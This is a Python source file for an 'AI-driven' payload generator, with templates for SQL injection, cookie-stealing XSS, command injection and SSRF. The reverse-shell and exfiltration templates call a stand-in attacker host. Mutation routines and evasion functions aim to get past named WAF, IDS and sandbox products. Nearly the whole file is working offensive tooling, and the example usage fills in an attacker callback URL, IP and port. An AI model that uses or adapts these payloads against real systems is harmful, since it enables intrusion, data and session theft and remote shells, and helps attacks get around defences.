"""
AI-Driven Payload Generator

This module implements AI-driven techniques for generating custom payloads
tailored to specific target environments and security controls.
"""

import random
import string
import json
import hashlib
import re
from typing import Dict, List, Any, Optional, Tuple, Set

class PayloadGenerator:
    """
    AI-driven payload generator for creating custom exploits and attack payloads
    tailored to specific target environments and security controls.
    """
    
    def __init__(self):
        """Initialize the payload generator."""
        # Load payload templates
        self.templates = self._load_templates()
        
        # Initialize mutation strategies
        self.mutation_strategies = [
            self._character_substitution,
            self._encoding_transformation,
            self._fragmentation,
            self._comment_insertion,
            self._case_manipulation
        ]
        
        # Initialize evasion techniques
        self.evasion_techniques = {
            "waf_bypass": self._apply_waf_bypass,
            "ids_evasion": self._apply_ids_evasion,
            "sandbox_evasion": self._apply_sandbox_evasion
        }
    
    def _load_templates(self) -> Dict[str, Dict[str, Any]]:
        """
        Load payload templates for different vulnerability types.
        
        Returns:
            Dictionary of payload templates
        """
        # In a real implementation, these would be loaded from a database or file
        return {
            "sql_injection": {
                "basic": [
                    "' OR 1=1 --",
                    "' UNION SELECT {columns} FROM {table} --",
                    "'; DROP TABLE {table} --"
                ],
                "blind": [
                    "' AND (SELECT 1 FROM {table} WHERE {condition})=1 --",
                    "' AND (SELECT SUBSTRING({column},1,1) FROM {table} LIMIT 1)='{char}' --"
                ],
                "time_based": [
                    "' AND (SELECT SLEEP(5)) --",
                    "' AND IF({condition},SLEEP(5),0) --"
                ]
            },
            "xss": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>"
                ],
                "dom_based": [
                    "<script>document.location='{evil_url}?c='+document.cookie</script>",
                    "<script>fetch('{evil_url}?c='+document.cookie)</script>"
                ],
                "stored": [
                    "<script>new Image().src='{evil_url}?c='+document.cookie;</script>",
                    "<script>navigator.sendBeacon('{evil_url}', document.cookie);</script>"
                ]
            },
            "command_injection": {
                "basic": [
                    "; cat /etc/passwd",
                    "| whoami",
                    "$(whoami)"
                ],
                "blind": [
                    "$(sleep 5)",
                    "`ping -c 5 {evil_ip}`",
                    "| curl {evil_url}"
                ],
                "reverse_shell": [
                    "bash -i >& /dev/tcp/{evil_ip}/{port} 0>&1",
                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{evil_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
                ]
            },
            "ssrf": {
                "basic": [
                    "http://{internal_ip}:{port}",
                    "file:///etc/passwd",
                    "gopher://{internal_ip}:{port}/_GET / HTTP/1.0"
                ],
                "cloud": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/"
                ]
            }
        }
    
    def generate_payload(self, vulnerability_type: str, target_info: Dict[str, Any], 
                         evasion_profile: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Generate a custom payload for a specific vulnerability type and target.
        
        Args:
            vulnerability_type: Type of vulnerability to exploit
            target_info: Information about the target environment
            evasion_profile: Profile of security controls to evade
            
        Returns:
            Dictionary containing the generated payload and metadata
        """
        if vulnerability_type not in self.templates:
            raise ValueError(f"Unsupported vulnerability type: {vulnerability_type}")
        
        # Select appropriate payload category based on target info
        category = self._select_payload_category(vulnerability_type, target_info)
        
        # Select base template
        base_template = self._select_base_template(vulnerability_type, category)
        
        # Customize template with target-specific information
        customized_payload = self._customize_template(base_template, target_info)
        
        # Apply evasion techniques if specified
        if evasion_profile:
            for technique, enabled in evasion_profile.items():
                if enabled and technique in self.evasion_techniques:
                    customized_payload = self.evasion_techniques[technique](customized_payload, target_info)
        
        # Apply mutations to create variations
        variations = self._generate_variations(customized_payload, num_variations=3)
        
        return {
            "primary_payload": customized_payload,
            "variations": variations,
            "vulnerability_type": vulnerability_type,
            "category": category,
            "evasion_techniques": list(evasion_profile.keys()) if evasion_profile else [],
            "estimated_success_probability": self._estimate_success_probability(customized_payload, target_info, evasion_profile)
        }
    
    def _select_payload_category(self, vulnerability_type: str, target_info: Dict[str, Any]) -> str:
        """
        Select the appropriate payload category based on target information.
        
        Args:
            vulnerability_type: Type of vulnerability to exploit
            target_info: Information about the target environment
            
        Returns:
            Selected payload category
        """
        categories = list(self.templates[vulnerability_type].keys())
        
        # In a real implementation, this would use more sophisticated logic
        # based on target information to select the most appropriate category
        
        if "blind" in categories and target_info.get("error_messages") == "suppressed":
            return "blind"
        elif "time_based" in categories and target_info.get("query_timeout") > 5:
            return "time_based"
        elif "stored" in categories and target_info.get("input_persistence") == True:
            return "stored"
        elif "dom_based" in categories and target_info.get("client_side_processing") == True:
            return "dom_based"
        elif "reverse_shell" in categories and target_info.get("outbound_connections") == "allowed":
            return "reverse_shell"
        elif "cloud" in categories and target_info.get("environment") in ["aws", "gcp", "azure"]:
            return "cloud"
        else:
            return "basic"
    
    def _select_base_template(self, vulnerability_type: str, category: str) -> str:
        """
        Select a base template for the payload.
        
        Args:
            vulnerability_type: Type of vulnerability to exploit
            category: Category of payload
            
        Returns:
            Selected base template
        """
        templates = self.templates[vulnerability_type][category]
        return random.choice(templates)
    
    def _customize_template(self, template: str, target_info: Dict[str, Any]) -> str:
        """
        Customize a template with target-specific information.
        
        Args:
            template: Base template to customize
            target_info: Information about the target environment
            
        Returns:
            Customized payload
        """
        # Replace placeholders with target-specific values
        customized = template
        
        # Replace {table} placeholder
        if "{table}" in template:
            tables = target_info.get("database_tables", ["users", "accounts", "customers"])
            customized = customized.replace("{table}", random.choice(tables))
        
        # Replace {column} placeholder
        if "{column}" in template:
            columns = target_info.get("database_columns", ["username", "password", "email"])
            customized = customized.replace("{column}", random.choice(columns))
        
        # Replace {columns} placeholder
        if "{columns}" in template:
            columns = target_info.get("database_columns", ["username", "password", "email"])
            num_columns = min(3, len(columns))
            selected_columns = random.sample(columns, num_columns)
            customized = customized.replace("{columns}", ",".join(selected_columns))
        
        # Replace {condition} placeholder
        if "{condition}" in template:
            columns = target_info.get("database_columns", ["username", "password", "email"])
            column = random.choice(columns)
            customized = customized.replace("{condition}", f"{column} LIKE '%admin%'")
        
        # Replace {char} placeholder
        if "{char}" in template:
            customized = customized.replace("{char}", random.choice("abcdefghijklmnopqrstuvwxyz"))
        
        # Replace {evil_url} placeholder
        if "{evil_url}" in template:
            evil_url = target_info.get("callback_url", "https://attacker.com/collect")
            customized = customized.replace("{evil_url}", evil_url)
        
        # Replace {evil_ip} placeholder
        if "{evil_ip}" in template:
            evil_ip = target_info.get("callback_ip", "10.0.0.1")
            customized = customized.replace("{evil_ip}", evil_ip)
        
        # Replace {port} placeholder
        if "{port}" in template:
            port = target_info.get("callback_port", 4444)
            customized = customized.replace("{port}", str(port))
        
        # Replace {internal_ip} placeholder
        if "{internal_ip}" in template:
            internal_ip = target_info.get("internal_ip", "127.0.0.1")
            customized = customized.replace("{internal_ip}", internal_ip)
        
        return customized
    
    def _generate_variations(self, payload: str, num_variations: int = 3) -> List[str]:
        """
        Generate variations of a payload using mutation strategies.
        
        Args:
            payload: Base payload to mutate
            num_variations: Number of variations to generate
            
        Returns:
            List of payload variations
        """
        variations = []
        
        for _ in range(num_variations):
            # Apply 1-3 random mutation strategies
            num_mutations = random.randint(1, 3)
            mutated_payload = payload
            
            for _ in range(num_mutations):
                strategy = random.choice(self.mutation_strategies)
                mutated_payload = strategy(mutated_payload)
            
            variations.append(mutated_payload)
        
        return variations
    
    def _character_substitution(self, payload: str) -> str:
        """
        Apply character substitution mutation.
        
        Args:
            payload: Payload to mutate
            
        Returns:
            Mutated payload
        """
        substitutions = {
            'a': ['a', '@', '4', 'á', 'à'],
            'e': ['e', '3', 'é', 'è'],
            'i': ['i', '1', '!', 'í', 'ì'],
            'o': ['o', '0', 'ó', 'ò'],
            's': ['s', '5', '$'],
            'l': ['l', '1'],
            't': ['t', '+', '7']
        }
        
        result = ""
        for char in payload:
            if char.lower() in substitutions and random.random() < 0.3:
                result += random.choice(substitutions[char.lower()])
            else:
                result += char
        
        return result
    
    def _encoding_transformation(self, payload: str) -> str:
        """
        Apply encoding transformation mutation.
        
        Args:
            payload: Payload to mutate
            
        Returns:
            Mutated payload
        """
        encoding_types = ["hex", "url", "unicode", "html"]
        encoding_type = random.choice(encoding_types)
        
        if encoding_type == "hex":
            # Encode random portions as hex
            parts = []
            for char in payload:
                if random.random() < 0.2:
                    parts.append(f"\\x{ord(char):02x}")
                else:
                    parts.append(char)
            return "".join(parts)
        
        elif encoding_type == "url":
            # Encode random portions as URL encoding
            parts = []
            for char in payload:
                if random.random() < 0.2 and not char.isalnum():
                    parts.append(f"%{ord(char):02x}")
                else:
                    parts.append(char)
            return "".join(parts)
        
        elif encoding_type == "unicode":
            # Encode random portions as Unicode
            parts = []
            for char in payload:
                if random.random() < 0.2:
                    parts.append(f"\\u{ord(char):04x}")
                else:
                    parts.append(char)
            return "".join(parts)
        
        elif encoding_type == "html":
            # Encode random portions as HTML entities
            parts = []
            for char in payload:
                if random.random() < 0.2:
                    parts.append(f"&#{ord(char)};")
                else:
                    parts.append(char)
            return "".join(parts)
        
        return payload
    
    def _fragmentation(self, payload: str) -> str:
        """
        Apply fragmentation mutation.
        
        Args:
            payload: Payload to mutate
            
        Returns:
            Mutated payload
        """
        # This is a simplified implementation
        # In a real system, this would be more sophisticated and context-aware
        
        if "<script>" in payload and "</script>" in payload:
            # Fragment JavaScript
            js_content = payload.split("<script>")[1].split("</script>")[0]
            fragmented_js = js_content.replace("document.", "document/**/.")
            return payload.replace(js_content, fragmented_js)
        
        elif "SELECT" in payload.upper() and "FROM" in payload.upper():
            # Fragment SQL
            return payload.replace("SELECT", "SEL/**/ECT").replace("FROM", "FR/**/OM")
        
        elif ";" in payload and ("cat" in payload or "whoami" in payload):
            # Fragment command injection
            for cmd in ["cat", "whoami", "ls", "pwd"]:
                if cmd in payload:
                    char_list = list(cmd)
                    fragmented_cmd = "\\".join(char_list)
                    return payload.replace(cmd, fragmented_cmd)
        
        return payload
    
    def _comment_insertion(self, payload: str) -> str:
        """
        Apply comment insertion mutation.
        
        Args:
            payload: Payload to mutate
            
        Returns:
            Mutated payload
        """
        if "<script>" in payload:
            # Insert comments in JavaScript
            js_content = payload.split("<script>")[1].split("</script>")[0]
            words = js_content.split()
            for i in range(len(words) - 1):
                if random.random() < 0.3:
                    words[i] += "/*" + self._random_string(5) + "*/"
            modified_js = " ".join(words)
            return payload.replace(js_content, modified_js)
        
        elif "SELECT" in payload.upper() or "UNION" in payload.upper():
            # Insert comments in SQL
            sql_keywords = ["SELECT", "FROM", "WHERE", "UNION", "AND", "OR"]
            result = payload
            for keyword in sql_keywords:
                if keyword in result.upper():
                    if random.random() < 0.5:
                        comment = "/**/" if random.random() < 0.5 else "-- " + self._random_string(5) + "\n"
                        result = result.replace(keyword, keyword + comment)
                    else:
                        comment = "/**/" if random.random() < 0.5 else "-- " + self._random_string(5) + "\n"
                        result = result.replace(keyword, comment + keyword)
            return result
        
        return payload
    
    def _case_manipulation(self, payload: str) -> str:
        """
        Apply case manipulation mutation.
        
        Args:
            payload: Payload to mutate
            
        Returns:
            Mutated payload
        """
        result = ""
        for char in payload:
            if char.isalpha():
                if random.random() < 0.5:
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        
        return result
    
    def _random_string(self, length: int) -> str:
        """
        Generate a random string.
        
        Args:
            length: Length of the string
            
        Returns:
            Random string
        """
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _apply_waf_bypass(self, payload: str, target_info: Dict[str, Any]) -> str:
        """
        Apply WAF bypass techniques.
        
        Args:
            payload: Payload to modify
            target_info: Information about the target environment
            
        Returns:
            Modified payload
        """
        waf_type = target_info.get("waf_type", "generic")
        
        if waf_type == "modsecurity":
            # ModSecurity bypass techniques
            if "<script>" in payload:
                return payload.replace("<script>", "<scr\tipt>").replace("</script>", "</scr\tipt>")
            elif "UNION" in payload.upper():
                return payload.replace("UNION", "/*!50000UnIoN*/")
        
        elif waf_type == "cloudflare":
            # Cloudflare bypass techniques
            if "<script>" in payload:
                return payload.replace("<script>", "<svg/onload=eval>").replace("</script>", "")
            elif "UNION" in payload.upper():
                return payload.replace("UNION", "/*!20000%0d%0aUnIoN*/")
        
        elif waf_type == "akamai":
            # Akamai bypass techniques
            if "<script>" in payload:
                return payload.replace("<script>", "<details ontoggle=eval>").replace("</script>", "</details>")
        
        # Generic WAF bypass
        if "<script>" in payload:
            return payload.replace("<script>", "<script/x>")
        elif "UNION" in payload.upper():
            return payload.replace("UNION", "%55NION")
        elif "SELECT" in payload.upper():
            return payload.replace("SELECT", "%53ELECT")
        
        return payload
    
    def _apply_ids_evasion(self, payload: str, target_info: Dict[str, Any]) -> str:
        """
        Apply IDS evasion techniques.
        
        Args:
            payload: Payload to modify
            target_info: Information about the target environment
            
        Returns:
            Modified payload
        """
        ids_type = target_info.get("ids_type", "generic")
        
        if ids_type == "snort":
            # Snort evasion techniques
            if "cat /etc/passwd" in payload:
                return payload.replace("cat /etc/passwd", "c${z}at /et${z}c/pas${z}swd")
            elif "<script>" in payload:
                return payload.replace("<script>", "<scr\nip\rt>")
        
        elif ids_type == "suricata":
            # Suricata evasion techniques
            if "cat /etc/passwd" in payload:
                return payload.replace("cat /etc/passwd", "cat /e?c/p*swd")
            elif "<script>" in payload:
                return payload.replace("<script>", "<script\u2028>")
        
        # Generic IDS evasion
        if "cat /etc/passwd" in payload:
            return payload.replace("cat /etc/passwd", "cat /e\"\"tc/pa\"\"sswd")
        elif "<script>" in payload:
            return payload.replace("<script>", "<scr<script>ipt>")
        
        return payload
    
    def _apply_sandbox_evasion(self, payload: str, target_info: Dict[str, Any]) -> str:
        """
        Apply sandbox evasion techniques.
        
        Args:
            payload: Payload to modify
            target_info: Information about the target environment
            
        Returns:
            Modified payload
        """
        # Add time delays or environment checks to evade sandboxes
        if "document.cookie" in payload:
            # Add browser fingerprinting to XSS payloads
            evasion_code = """
            if(navigator.webdriver || navigator.userAgent.indexOf('HeadlessChrome') > -1) {
                // Do nothing in sandbox
            } else {
                // Original payload
                %s
            }
            """
            original_code = payload.split("<script>")[1].split("</script>")[0]
            modified_code = evasion_code % original_code
            return payload.replace(original_code, modified_code)
        
        elif "bash -i" in payload or "python -c" in payload:
            # Add environment checks to shell payloads
            return payload.replace("bash -i", "[ $(who | wc -l) -gt 0 ] && bash -i")
        
        return payload
    
    def _estimate_success_probability(self, payload: str, target_info: Dict[str, Any], 
                                     evasion_profile: Optional[Dict[str, Any]] = None) -> float:
        """
        Estimate the probability of successful exploitation.
        
        Args:
            payload: Generated payload
            target_info: Information about the target environment
            evasion_profile: Profile of security controls to evade
            
        Returns:
            Estimated success probability (0.0 to 1.0)
        """
        # Base probability
        base_probability = 0.7
        
        # Adjust based on payload complexity
        payload_length = len(payload)
        if payload_length > 100:
            base_probability -= 0.1
        
        # Adjust based on target security level
        security_level = target_info.get("security_level", "medium")
        if security_level == "high":
            base_probability -= 0.2
        elif security_level == "low":
            base_probability += 0.1
        
        # Adjust based on evasion techniques
        if evasion_profile:
            num_evasion_techniques = sum(1 for v in evasion_profile.values() if v)
            base_probability += 0.05 * num_evasion_techniques
        
        # Adjust based on payload type
        if "<script>" in payload:
            # XSS payloads
            if target_info.get("content_security_policy") == True:
                base_probability -= 0.2
        elif "UNION SELECT" in payload.upper():
            # SQL injection payloads
            if target_info.get("prepared_statements") == True:
                base_probability -= 0.3
        elif "bash -i" in payload:
            # Command injection payloads
            if target_info.get("input_sanitization") == True:
                base_probability -= 0.25
        
        # Ensure probability is within valid range
        return max(0.1, min(0.9, base_probability))


# Example usage
if __name__ == "__main__":
    # Create payload generator
    generator = PayloadGenerator()
    
    # Define target information
    target_info = {
        "database_tables": ["users", "products", "orders"],
        "database_columns": ["id", "username", "password", "email"],
        "error_messages": "visible",
        "query_timeout": 10,
        "callback_url": "https://attacker.example.com/collect",
        "callback_ip": "192.168.1.100",
        "callback_port": 4444,
        "internal_ip": "10.0.0.1",
        "security_level": "medium",
        "waf_type": "modsecurity",
        "content_security_policy": False,
        "prepared_statements": False,
        "input_sanitization": True
    }
    
    # Define evasion profile
    evasion_profile = {
        "waf_bypass": True,
        "ids_evasion": True,
        "sandbox_evasion": False
    }
    
    # Generate SQL injection payload
    sql_payload = generator.generate_payload("sql_injection", target_info, evasion_profile)
    print("SQL Injection Payload:")
    print(f"Primary: {sql_payload['primary_payload']}")
    print(f"Variations: {sql_payload['variations']}")
    print(f"Success Probability: {sql_payload['estimated_success_probability']:.2f}")
    
    # Generate XSS payload
    xss_payload = generator.generate_payload("xss", target_info, evasion_profile)
    print("\nXSS Payload:")
    print(f"Primary: {xss_payload['primary_payload']}")
    print(f"Variations: {xss_payload['variations']}")
    print(f"Success Probability: {xss_payload['estimated_success_probability']:.2f}")
    
    # Generate command injection payload
    cmd_payload = generator.generate_payload("command_injection", target_info, evasion_profile)
    print("\nCommand Injection Payload:")
    print(f"Primary: {cmd_payload['primary_payload']}")
    print(f"Variations: {cmd_payload['variations']}")
    print(f"Success Probability: {cmd_payload['estimated_success_probability']:.2f}")